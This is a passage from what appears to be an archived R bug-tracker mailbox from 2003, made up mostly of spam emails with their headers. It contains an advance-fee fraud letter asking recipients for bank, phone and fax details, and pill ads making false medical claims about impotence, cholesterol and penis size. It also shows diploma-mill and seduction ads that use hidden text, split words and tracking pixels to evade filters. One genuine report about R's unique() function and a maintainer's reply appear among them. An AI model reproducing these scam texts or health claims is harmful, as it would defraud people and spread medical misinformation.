                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Cli=
maxes.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients)</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients).&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Org=
asms!</font></li>
                    <li><font face=3D"Arial,Helvetica">Does Not Increas</f=
ont><font face=3D"Arial,Helvetica">e 
                      Blood Pressure!&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Increases circulati=
on in 
                      men so erections become firmer.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps men with a se=
xual response 
                      dysfunction, or&nbsp; lack of </font><font face=3D"A=
rial,Helvetica">interest 
                      in sex.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Clears impotency pr=
oblems.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Relieves Emotional =
Ups Downs, 
                      and Headaches!</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps Relieve Prost=
ate Problems.</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Lowers Cholesterol.=
&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Very Affordable Pri=
ce</font> 
                    </li>
                  </ul>
                </div>
                <ul>
                </ul>
                <p align=3D"center"><a href=3D"http://random.liljoesmith.c=
om/h/iron.html"><font face=3D"Arial, Helvetica, sans-serif" size=3D"3">Vis=
it 
                  Our Web Site Click Here:<br>
                  Learn about our special offer!.</font></a><font face=3D"=
Verdana" size=3D"2">&nbsp;</font> 
              </div>
            </td>
            <td width=3D"4%">&nbsp;</td>
          </tr>
        </table>
        <p align=3D"center">&nbsp;</p>
      </div>
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font size=3D"1"> <a href=3D"http://&#66&#117&#1=
21&#104&#103&#72&#78&#111&#87.&#67&#111&#77/remove_page1.html"><font
size=3D=
"2">Click 
        here to stop these notifications</font></a></font> 
    </td>
  </tr>
</table>
<br>
&nbsp;mlj u   rc fnsidmitdf
szwaygdripcx
  ijzyd ovegeoowlqd
l iqhy
qlv   
ystcjwsa

--8BFC_0A15FCCA.--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3433 *
Subject: Rates are predicted to go back up, REFINANCE Today!!  l
From: "Milagros Cooley" <9s9u783e0d82@xmsg.com>
Date: Tue, 08 Jul 03 22:19:30 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3433 <==
From 9s9u783e0d82@xmsg.com Tue Jul  8 13:29:11 2003
Received: from pool-141-149-14-97.alb.east.verizon.net (pool-141-149-14-97.alb.east.verizon.net [141.149.14.97])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h68BReJH001212;
	Tue, 8 Jul 2003 13:28:18 +0200 (MET DST)
Received: from b9.nale.com [204.61.160.212] by pool-141-149-14-97.alb.east.verizon.net SMTP id 1thjWs3eA5x1uy; Tue, 08 Jul 2003 22:19:30 -0500
Message-ID: <oy0lmz2pzbs$o9$9--8ap0b926h64@160zo>
From: "Milagros Cooley" <9s9u783e0d82@xmsg.com>
To: ce@biostat.ku.dk
Subject: Rates are predicted to go back up, REFINANCE Today!!  l
Date: Tue, 08 Jul 03 22:19:30 GMT
X-Mailer: eGroups Message Poster
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="DBE_D6A3_..7B_1EFC452."
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--DBE_D6A3_..7B_1EFC452.
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<body bgcolor=3D"#ffffff">
<div align=3Dcenter>
<a href=3D'http://mortcheap.com/4/index.asp?RefID=3D427047'><img src=3D'ht=
tp://mort888.com/pic_morta/1.gif' border=3D0></a>
<table width=3D516>
	<tr><td><font face=3D"arial,helvetica" size=3D1>Please know that we do no=
t want to send you information regarding our special offers if you do not =
wish to receive it.  If you would no longer like us to contact you or feel=
 that you have received this email in error, please <a href=3D"http://mort=
cheap.com/auto/index.htm">click here to unsubscribe</a>.</font></td></tr>
</table>
</div>
</body>
</html>
p xuayvw jbjrpfd znlnyan au

--DBE_D6A3_..7B_1EFC452.--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3434 *
Subject: A CRY FOR HELP.
From: SASA JOE <sasa611joe@netscpe.net>
Date: Tue, 08 Jul 2003 16:35:09 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3434 <==
From sasa611joe@netscpe.net Tue Jul  8 16:37:55 2003
Received: from netscpe440.com ([62.58.168.62])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h68EbnJI003103
	for <r-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 16:37:54 +0200 (MET DST)
Message-Id: <200307081437.h68EbnJI003103@pubhealth.ku.dk>
From: SASA JOE <sasa611joe@netscpe.net>
To: r-bugs@biostat.ku.dk
Reply-To: sasa611joe@netscape.net
Subject: A CRY FOR HELP.
Date: Tue, 08 Jul 2003 16:35:09 +0200
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="1e78e981-5952-4c67-b52d-6e429c555bed"


This is a multi-part message in MIME format
--1e78e981-5952-4c67-b52d-6e429c555bed
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: quoted-printable

DEAR FRIEND,

THROUGH THE COURTESY OF BUSINESS OPPORTUNITY, I TAKE LIBERTY ANCHORED ON A =
STRONG DESIRE TO SOLICIT YOUR ASSISTANCE ON THIS MUTUALLY BENEFICIAL AND =
RISKFREE TRANSACTION WHICH I HOPE YOU WILL GIVE YOUR URGENT ATTENTION.

I AM MR.SASA JOE I AM MOVED TO WRITE YOU THIS LETTER ,THIS WAS IN
CONFIDENCE CONSIDERING OUR PRESENT CIRCUMSTANCE AND SITUATION.

I ESCAPED WITH MY WIFE AND CHILDREN  OUT OF SIERRA LEONE TO GHANA WHERE WE
ARE PRESENTLY RESIDING  ON TEMPORARY POLITICAL ASYLUM.
HOWEVER DUE TO THIS SITUATION I DECIDED TO CHANGE MOST OF MY BILLIONS OF =
DOLLARS DEPOSITED IN SWISS BANK AND OTHER COUNTRIES INTO OTHER FORMS OF MONEY =
CODED FOR SAFE PURPOSE BECAUSE THE NEW HEAD OF STATES  AHMED TIJJAN KABBA =
MADE ARRANGEMENTS WITH THE SWISS GOVERNMENT AND OTHER EUROPEAN COUNTRIES TO =
FREEZE ALL MY TREASURES DEPOSITED IN SOME EUROPEAN COUNTRIES,HENCE I AND MY =
WIFE  ALONG WITH MY CHILDREN, DECIDED LAYING LOW IN AFRICA TO STUDY THE =
SITUATION TILL WHEN THINGS GETS BETTER,SINCE PRESIDENT TIJJAN KABBA TAKING =
OVER GOVERNMENT AGAIN IN SIERRA LEONE ONE OF MY CHATEAUX IN SOUTHERN FRANCE =
WAS CONFISCATED BY THE FRENCH GOVERNMENT,AND AS SUCH WE HAD TO CHANGE OUR =
IDENTITY SO THAT OUR INVESTMENT WILL NOT BE TRACED AND CONFISCATED.

I HAVE DEPOSITED THE SUM OF THIRTY MILLION,FIVE HUNDRED THOUSAND UNITED =
STATES DOLLARS(US$30,500,000)WITH A SECURITY COMPANY FOR SAFEKEEPING. THE =
FUNDS ARE SECURITY CODED TO PREVENT THEM FROM KNOWING THE ACTUAL CONTENTS.

WHAT I WANT YOU TO DO NOW IS TO INDICATE YOUR INTEREST THAT YOU WILL ASSIST =
ME AND MY IMMEDIATE FAMILY BY RECEIVING THE MONEY ON OUR BEHALF.
THE ACCOUNT REQUIRED FOR THIS PROJECT CAN EITHER BE PERSONAL,COMPANY OR AN =
OFFSHORE ACCOUNT THAT YOU HAVE TOTAL CONTROL OVER,YOUR AREA OF SPECIALISATION =
WILL NOT BE A HINDERANCE TO THE SUCCESSFUL EXECUTION OF THIS TRANSACTION.

ACKNOWLEDGE THIS MESSAGE,SO THAT I CAN INTRODUCE YOU TO MY FAMILY AS OUR =
FOREIGN TRUSTED PARTNER WHO SHALL TAKE CHARGE OF OUR INVESTMENT ABROAD WHERE =
WE NOW PLAN TO SETTLE. 

I WANT YOU TO ASSIST US IN INVESTING THIS MONEY,BUT I WILL NOT WANT OUR
IDENTITY REVEALED.I WILL ALSO WANT TO BUY PROPERTIES AND STOCKS IN
MULTI-NATIONAL COMPANIES AND TO ENGAGE IN OTHER SAFE AND NON SPECULATIVE =
INVESTMENTS. WE HAVE BEEN THROUGH A LOT OF HEALTH AND SPIRITUAL TURMOIL, =
HENCE WILL NEED YOUR UNDERSTANDING AND ASSISTANCE.

MAY I AT THIS POINT EMPHASIZE THE HIGH LEVEL OF CONFIDENTIALLITY WHICH THIS =
BUSINESS DEMANDS AND HOPE YOU WILL NOT BETRAY THE TRUST AND CONFIDENCE WHICH =
WE REPOSE IN YOU.I SHALL PUT YOU IN THE PICTURE OF THIS BUSINESS,I.E TELL YOU =
WHERE THE FUNDS ARE CURRENTLY BEING MAINTAINED AND ALSO DISCUSS OTHER =
MODALITIES INCLUDING REMUNERATION FOR YOUR SERVICES.

I SHALL INFORM YOU WITH  THE NEXT LINE OF ACTION AS SOON AS I RECEIVE YOUR =
POSITIVE RESPONSE.

IS THIS PROPOSITION ATTAINABLE?IF IT IS,PLEASE KINDLY FURNISH ME IMMEDIATELY =
BY E-MAIL WITH YOUR DIRECT TELEPHONE AND FAX NUMBERS TO ENHANCE THE =
CONFIDENTIALLITY WHICH THIS BUSINESS DEMANDS.

BEST REGARDS

MR.SASA JOE.  
--1e78e981-5952-4c67-b52d-6e429c555bed--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3435 *
Subject: unique in versions 1.6.2 and 1.5.1
From: goulard@toulouse.inra.fr
Date: Tue, 8 Jul 2003 18:31:12 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3435 <==
From goulard@toulouse.inra.fr Tue Jul  8 18:31:13 2003
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h68GVCJH003661
	for <R-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 18:31:13 +0200 (MET DST)
Date: Tue, 8 Jul 2003 18:31:12 +0200 (MET DST)
Message-Id: <200307081631.h68GVCJH003661@pubhealth.ku.dk>
From: goulard@toulouse.inra.fr
To: R-bugs@biostat.ku.dk
Subject: unique in versions 1.6.2 and 1.5.1

Full_Name: goulard
Version: 1.6.2 and 1.5.1
OS: 
Submission from: (NULL) (193.54.96.5)


The function unique behaves differently in version 1.6 and in version 1.5.

R : Copyright 2003, The R Development Core Team
Version 1.6.2  (2003-01-10)

> Tz
 [1] 0 2 4 1 3 2 9 9 3 9 1 6 7 3 8 2 2 8 2 0 9 6 8 1 4
> unique(Tz)
[1] 0 2 4 1 3 9 6 7 8
> unique(matrix(Tz,5,5))
     [,1] [,2] [,3] [,4] [,5]
[1,]    0    2    1    2    9
[2,]    2    9    6    2    6
[3,]    4    9    7    8    8
[4,]    1    3    3    2    1
[5,]    3    9    8    0    4


R : Copyright 2002, The R Development Core Team
Version 1.5.1 Patched (2002-08-28)

> unique(Tz)
[1] 0 2 4 1 3 9 6 7 8
> unique(matrix(Tz,5,5))
[1] 0 2 4 1 3 9 6 7 8




==> 3435.reply.1 <==
From p.dalgaard@biostat.ku.dk Tue Jul  8 18:49:00 2003
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h68Gn0JH003764;
	Tue, 8 Jul 2003 18:49:00 +0200 (MET DST)
Received: from blueberry.kubism.ku.dk (localhost.localdomain [127.0.0.1])
	by blueberry.kubism.ku.dk (8.12.8/8.12.8) with ESMTP id h68GpO8e010033;
	Tue, 8 Jul 2003 18:51:25 +0200
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.12.8/8.12.8/Submit) id h68GpO62010029;
	Tue, 8 Jul 2003 18:51:24 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: goulard@toulouse.inra.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] unique in versions 1.6.2 and 1.5.1 (PR#3435)
References: <200307081631.h68GVEJH003665@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 08 Jul 2003 18:51:24 +0200
In-Reply-To: <200307081631.h68GVEJH003665@pubhealth.ku.dk>
Message-ID: <x2znjpc67n.fsf@biostat.ku.dk>
Lines: 23
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
Content-Transfer-Encoding: 8bit

goulard@toulouse.inra.fr writes:

> Full_Name: goulard
> Version: 1.6.2 and 1.5.1
> OS: 
> Submission from: (NULL) (193.54.96.5)
> 
> 
> The function unique behaves differently in version 1.6 and in version 1.5.

Neither of those versions are current, and the change was announced
clearly in the NEWS file under NEW FEATURES for v. 1.6.0:

    o   duplicated() and unique() have methods for matrices and arrays
        (based on ideas from Jens Oehlschlägel).

So in which sense is this a bug???

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3436 *
Subject: Splendid university degree proposal for all!
From: "Soules Pingrey" <SoulesPingrey@aol.com>
Date: 8 Jul 2003 10:58:19 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3436 <==
From dmichelec0jt80o2n87@msn.com Tue Jul  8 19:58:26 2003
Received: from hotmail.com (bay3-dav127.bay3.hotmail.com [65.54.169.157])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h68HwOJH003991
	for <r-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 19:58:25 +0200 (MET DST)
Received: from mail pickup service by hotmail.com with Microsoft SMTPSVC;
	 Tue, 8 Jul 2003 10:58:19 -0700
Received: from 216.56.22.26 by bay3-dav127.bay3.hotmail.com with DAV;
	Tue, 08 Jul 2003 17:58:19 +0000
X-Originating-IP: [216.56.22.26]
X-Originating-Email: [dmichelec0jt80o2n87@msn.com]
To: "Correo Space" <CorreoSpace@email.com>
Subject: Splendid university degree proposal for all!
From: "Soules Pingrey" <SoulesPingrey@aol.com>
X-Originating-Ip: [7.940.95.01]
Content-Type: multipart/alternative; boundary="eyfBjfnrHmcOgaR442GcJ478i63p4e5MOdvCMJ3rK5R5HogEFuNT1AbjBgJ"
Content-Transfer-Encoding: 7bit
Message-ID: <BAY3-DAV127NU1pTxkV000466d5@hotmail.com>
X-OriginalArrivalTime: 08 Jul 2003 17:58:19.0642 (UTC) FILETIME=[83D225A0:01C3457A]
Date: 8 Jul 2003 10:58:19 -0700

--eyfBjfnrHmcOgaR442GcJ478i63p4e5MOdvCMJ3rK5R5HogEFuNT1AbjBgJ
Content-Transfer-Encoding: 7bit
Content-Type: text/html; charset="US-ASCII"

<HTML><CENTER><FONT SIZE=4 FACE=Arial COLOR=#045B6A RR><B>Get A Degree In Any Experienced Field</B>
<BR><BR><FONT SIZE=3 FACE=Arial COLOR=#75000C>Ca<!V>l<!U>l<!Q> <B>1<!F>-31<!V>0<!S>-943-<!S>32<!T>51</B> <!W>N<!K>o<!J>w <!N>F<!O>o<!E>r<!W> <!D>Mor<!J>e In<!Z>form<!R>ati<!I>on<!J>!<!E>
<BR><BR><FONT SIZE=3 FACE=Arial COLOR=BLACK>
<!U>I<!N>t<!T> is a <!R>we<!B>ll<!C> kn<!F>o<!S>wn <!E>f<!E>a<!Y>ct<!F> tha<!F>t <!M>p<!Z>eopl<!D>e<!O> <!G>wh<!W>o<!H> poss<!D>es<!C> a deg<!D>r<!R>ee are <!H>look<!S>e<!M>d<!M> <!H>upon as<!N> <!V>t<!Z>he <!U>e<!L>li<!X>t<!R>e<BR>
<!P>If<!M> <!I>you<!K> hav<!K>e<!L> a<!Q> d<!Q>eg<!X>r<!P>ee,<!B> y<!F>o<!G>u <!P>a<!L>r<!S>e <!B>almos<!C>t ass<!G>u<!Z>red <!V>t<!U>o<!Q> g<!F>ain<!V> <!S>lever<!S>ag<!T>e i<!W>n<!K> <!J>th<!N>e<!O> <!E>w<!W>o<!D>rk <!J>plac<!Z>e
<BR><BR><FONT SIZE=3 FACE=Arial COLOR=#75000C>T<!R>her<!I>e'<!J>s<!E> no <!U>t<!N>e<!T>sting <!R>re<!B>qu<!C>ire<!F>d<!S>, s<!E>i<!E>m<!Y>pl<!F>y ca<!F>ll<!M> <!Z><B>1-31<!D>0<!O>-<!G>94<!W>3<!H>-3251<!D></B> f<!C>or mor<!D>e<!R> inform<!H>atio<!S>n<!M>.<!M><!H>
<BR><BR><FONT SIZE=1 COLOR="BLACK"><BR RR><BR RR><!-- l3dR3i6g2NXdfTANDZkYTVZazA3LTA4aXhyMU1NMUREX31jmkL8kPyOi72116 --></HTML>

--eyfBjfnrHmcOgaR442GcJ478i63p4e5MOdvCMJ3rK5R5HogEFuNT1AbjBgJ--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3437 *
Subject: Enhance your male size
From: "Christopher" <*@beer.com>
Date: Wed, 09 Jul 03 12:20:45 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3437 <==
From *@beer.com Tue Jul  8 23:26:46 2003
Received: from 192.38.18.10 ([211.110.11.182])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h68LQgJH004709
	for <r-bugs@biostat.ku.dk>; Tue, 8 Jul 2003 23:26:44 +0200 (MET DST)
Received: from oxez.ngyyf24.net ([213.164.242.43])
	by 192.38.18.10 with ESMTP id 28874866;
	Wed, 09 Jul 2003 12:20:45 -0100
Message-ID: <q9g571j195-12k--$6@fl28b>
From: "Christopher" <*@beer.com>
Reply-To: "Christopher" <*@beer.com>
To: r-bugs@biostat.ku.dk
Subject: Enhance your male size
Date: Wed, 09 Jul 03 12:20:45 GMT
X-Mailer: Internet Mail Service (5.5.2650.21)
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="A141.2E059EC9_9_1252.AB"
X-Priority: 3
X-MSMail-Priority: Normal


--A141.2E059EC9_9_1252.AB
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD><TITLE>Cybermed</TITLE>

<META http-equiv=3DContent-Type content=3D"text/html; charset=3Diso-8859-1=
"></HEAD>

<BODY style=3D"SCROLLBAR-FACE-COLOR: #ebeaea; SCROLLBAR-HIGHLIGHT-COLOR: #=
aeaaaa; SCROLLBAR-SHADOW-COLOR: #a9a9a9; SCROLLBAR-3DLIGHT-COLOR: #e5e5e5;=
 SCROLLBAR-ARROW-COLOR: #0846d1; SCROLLBAR-DARKSHADOW-COLOR: #545252" scro=
ll=3Dyes>

<IMG height=3D1 src=3D"http://www.aih01.com/images/trans.gif?issue=3D4736&=
amp;us=3D39265006" width=3D1> 
<font color=3D"#666666" face=3D"Arial"><font size=3D"1">You are receiving =
this email from
&quot;Potent Products 4 Men&quot; Newsletter. If you are listed in our dat=
abase, you will receive&nbsp;
occasional announcements on various male-related products. If you are rece=
iving
this email unsolicited, we wish to have you removed from our database <b>i=
mmediately</b>.&nbsp;<span style=3D"mso-fareast-font-family: Times New Rom=
an; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-langua=
ge: AR-SA">
Please see below for removal instructions.</span></font><span style=3D"fon=
t-size: 12.0pt; mso-fareast-font-family: Times New Roman; mso-ansi-languag=
e: EN-US; mso-fareast-language: EN-US; mso-bidi-language: AR-SA">&nbsp;</s=
pan></font>
<p align=3D"center"><b><a title=3D"http://www.www.enlargepills.net"
href=3D=
"http://www.medicallyproven.biz/cgi-bin/a.pl?cybermed&amp;2452" target=3D"=
_blank"><font size=3D"5" color=3D"#0000FF">Watch
out for Cheap Imitations!</font></a></b></p>
<p align=3D"center"><b><font color=3D"#0000FF"><a title=3D"http://www.enla=
rgepills.net" href=3D"http://www.medicallyproven.biz/cgi-bin/a.pl?cybermed=
&amp;2452" target=3D"_blank"><font size=3D"3">Recent
studies have proven what most people already know: <u>That</u></font></a><=
u><a title=3D"http://www.enlargepills.net" href=3D"http://www.medicallypro=
ven.biz/cgi-bin/a.pl?cybermed&amp;2452" target=3D"_blank"><font color=3D"#=
003399" size=3D"3">&nbsp;
most Penis Enlargement Pills are </font><font color=3D"#003399" size=3D"4"=
>completely
useless.</font><font color=3D"#003399" size=3D"3">&nbsp;We set out to desi=
gn a
program that really works.</font></a></u></font></b></p>
<form method=3D"POST" action=3D"--WEBBOT-SELF--" onSubmit>
  <!--webbot bot=3D"SaveResults" startspan U-File=3D"C:\_private\form_resu=
lts.txt"
  S-Format=3D"TEXT/CSV" S-Label-Fields=3D"TRUE" --><input TYPE=3D"hidden" =
NAME=3D"VTI-GROUP" VALUE=3D"0"><!--webbot
  bot=3D"SaveResults" endspan -->
  <p align=3D"center"><font face=3D"Verdana, Arial, Helvetica, sans-serif"=
 size=3D"2">&quot;I
  must have used every penis enlargement pill available before I tried <b>=
Power
  Enlarge Pro</b>. I sure wish now that I saved all that money and bought =
<b>P.E.P.</b>
  pills instead! No other pill could do for me what these ones did. <b>Fin=
ally a
  pill that really does what it promises! </b>&quot;
Walt=FFFFFF97California</fo=
nt><font size=3D"2"><br>
  </font></p>
</form>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<a title=3D"http://www.enlargepills.net" href=3D"http://www.medicallyprove=
n.biz/cgi-bin/a.pl?cybermed&amp;2452" target=3D"_blank"><img title=3D"http=
://www.enlargepills.net" src=3D"http://www.medicallyproven.biz/images/bann=
er1.gif" border=3D"2" width=3D"468" height=3D"80"></a></p>
<form method=3D"POST" action=3D"--WEBBOT-SELF--" onSubmit>
  <!--webbot bot=3D"SaveResults" startspan U-File=3D"C:\_private\form_resu=
lts.txt"
  S-Format=3D"TEXT/CSV" S-Label-Fields=3D"TRUE" --><input TYPE=3D"hidden" =
NAME=3D"VTI-GROUP" VALUE=3D"1"><!--webbot
  bot=3D"SaveResults" endspan -->
  <p align=3D"center"><b><font face=3D"Verdana, Arial, Helvetica, sans-ser=
if" color=3D"#339933" size=3D"4"><a title=3D"http://www.enlargepills.net" =
target=3D"_blank" href=3D"http://www.medicallyproven.biz/cgi-bin/a.pl?cybe=
rmed&amp;2452">NEW!!</a></font><a title=3D"http://www.enlargepills.net" hr=
ef=3D"http://www.enlargepills.net" target=3D"_blank"><font face=3D"Verdana=
, Arial, Helvetica, sans-serif" color=3D"#339933" size=3D"3">
  </font></a></b><a title=3D"http://www.enlargepills.net" target=3D"_blank=
" href=3D"http://www.medicallyproven.biz/cgi-bin/a.pl?cybermed&amp;2452"><=
font face=3D"Verdana, Arial, Helvetica, sans-serif" color=3D"#000000" size=
=3D"3">Order
  2 bottles or more and receive our <b>Power Enlarge Exercise manual</b>,
  absolutely FREE</font></a></p>
  <p align=3D"center"><font face=3D"Verdana, Arial, Helvetica, sans-serif"=
 size=3D"2">&quot;I
  tried 3 different brands of penis enlargement pills, each promising to
  &quot;add 4 inches!&quot; before I tried <b>Power Enlarge Pro</b>. I got=
 <b>NOTHING</b>
  from the other brands, but <b>P.E.P.</b> pills sent my sex drive through=
 the
  roof and extended my penis a whole 1.75 inches in length. Its also thick=
er,
  and <b>my erections last for hours</b>! My wife send her thanks!&quot;
  Bill=FFFFFF97San Antonio</font></p>
</form>
<p align=3D"center"><b><a title=3D"http://www.enlargepills.net" href=3D"ht=
tp://www.medicallyproven.biz/cgi-bin/a.pl?cybermed&amp;2452" target=3D"_bl=
ank"><font face=3D"Verdana, Arial, Helvetica, sans-serif" color=3D"#0000ff=
" size=3D"5">Click
HERE for FREE INFO!</font></a></b></p>
<p>&nbsp;</p>
<p align=3D"center"><font face=3D"Arial" size=3D"1" color=3D"#666666">Our =
affiliates are
often provided opt-in lists that contain some addresses that are in fact <=
b>not</b>
valid. If you are one of these persons, we apologize profusely, and can as=
sure
you that we will take <i><b>immediate</b></i> action towards removing your=
 email
address from any database <span style=3D"mso-fareast-font-family: Times Ne=
w Roman; mso-ansi-language: EN-US; mso-fareast-language: EN-US; mso-bidi-l=
anguage: AR-SA"><b><u>at
once</u>.</b> </span>Below is a 100% legitimate <b>removal link</b>- click=
 it
and provide your email and you will <b>never </b>again receive any email
announcements from any of our affiliates.</font>&nbsp;</p>
<p><b><font face=3D"helvetica,arial" size=3D"3" color=3D"#000000">To unsub=
scribe from this mailing list: click</font><font face=3D"helvetica,arial" =
color=3D"purple" size=3D"3">
<a title=3D"http://mail04-free-gifts.mx01.com/delete?l=3Dserver1.17-1be42a=
6-2896&amp;e=3Dandykidd%40telus.net" target=3D"_blank" href=3D"http://www.=
medicallyproven.biz/remove.htm">here</a>
</font></b><FONT face=3Dhelvetica,arial color=3Dpurple size=3D-1><BR><BR> =
</FONT>
</p>
</BODY>
</HTML>
wxxnl 
f

--A141.2E059EC9_9_1252.AB--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3438 *
Subject: Ugly guys + Hot women? You bet!
From: "Armando Allred" <z515av@yournaturaladvantage.com>
Date: Wed, 09 Jul 03 09:42:04 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3438 <==
From z515av@yournaturaladvantage.com Wed Jul  9 00:51:08 2003
Received: from pcp03453737pcs.indpnd01.mo.comcast.net (pcp03453737pcs.indpnd01.mo.comcast.net [68.86.62.72])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h68MorJH005078;
	Wed, 9 Jul 2003 00:51:07 +0200 (MET DST)
Received: from [7.249.105.27] by pcp03453737pcs.indpnd01.mo.comcast.net with SMTP; Wed, 09 Jul 2003 09:42:04 -0500
Message-ID: <505576-6$g9z-vme-1@fvl.47.yr>
From: "Armando Allred" <z515av@yournaturaladvantage.com>
Reply-To: "Armando Allred" <z515av@yournaturaladvantage.com>
To: <k.larsen@biostat.ku.dk>, <r-bugs@biostat.ku.dk>, <lts@biostat.ku.dk>
Subject: Ugly guys + Hot women? You bet!
Date: Wed, 09 Jul 03 09:42:04 GMT
X-Mailer: The Bat! (v1.52f) Business
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary=".B2.C_E_B_3E90EF6._CB6C"
X-Priority: 3
X-MSMail-Priority: Normal


--.B2.C_E_B_3E90EF6._CB6C
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<FONT COLOR=3D"white">bygone polariton condominium =
nerve customary</FONT>
<BR><body bgcolor=3DFFFFFF><center><br>
<table border=3D1 align=3D"left" cellpadding=3D0 cellspacing=3D0 bordercol=
or=3D#111111 width=3D500 bgcolor=3D#FFFFFF><tr><td><center><table
border=3D=
0 cellpadding=3D10 cellspacing=3D0 style=3D'border-collapse: collapse' bor=
dercolor=3D#111111 width=3D'100%' bgcolor=3D#FFFFFF><tr><td></center></cen=
ter>
        <p><u>Hot New Book Reveals...<br>
        </u>&nbsp;<center>
        <table border=3D"0" width=3D"100%" cellspacing=3D"0"
cellpadding=3D=
"3">
          <tr>
            <td width=3D"36%"><img border=3D"0" src=3D"http://www.seductio=
nissimple.com/seduction/images/magnet2.jpg" width=3D"150" height=3D"136"><=
/td>
            <td width=3D"64%" valign=3D"top" align=3D"left"><b><font
size=3D=
"4">&quot;How
              To Confidently Attract, Meet And Seduce More <font color=3D"=
#ff0000"><u>HOT</u></font> 
              Women Than You Can Ever Handle...</font></b>
              <p><b><font size=3D"4">And Easily Get Them To Line Up For Yo=
u And <u><font color=3D"#ff0000">BEG</font></u>
              You For More!&quot;</font></b></td>
          </tr>
        </table>
        </center>
        <FONT COLOR=3D"white">combustion discipline police =
equivocate alison</FONT>
        <p align=3D"left">If
        you're <b>afraid, shy or clumsy</b> when trying to meet beautiful =
women,
        and you want to learn every &quot;dirty little secret&quot; you'll=
 ever
        need for <b>meeting, dating and seducing women</b>, this may be th=
e <b>most
        important email</b> you will ever read!<BR>
        <FONT COLOR=3D"white">apology incinerate capricorn =
steppe lucky</FONT><BR>
      <p align=3D"right"><a href=3D"http://www.seductionissimple.com/seduc=
tion/"><b>Click here to learn how to
      make women want to you like crazy!<BR>
      <FONT COLOR=3D"white">ambivalent differ spook =
constrictor impatient</FONT></b></a>
      </center>
    </table></table><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><B=
R><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>
    <P align=3D"left"><FONT COLOR=3D"white">louisa thailand =
goatherd harrison withdrew</FONT><br>
    <FONT COLOR=3D"white">asteria macroscopic uganda =
appalachia siderite</FONT><BR>
    <FONT COLOR=3D"white">butadiene lisa lobotomy =
averring afford</FONT>
    <FONT COLOR=3D"white">beebe bridegroom correspond =
maniacal businessmen</FONT><BR>
    <FONT COLOR=3D"white">domineer megalomania earthquake =
bantus clifton</FONT>
    <BR>To never see another ad from us, please <A HREF=3D"http://www.regg=
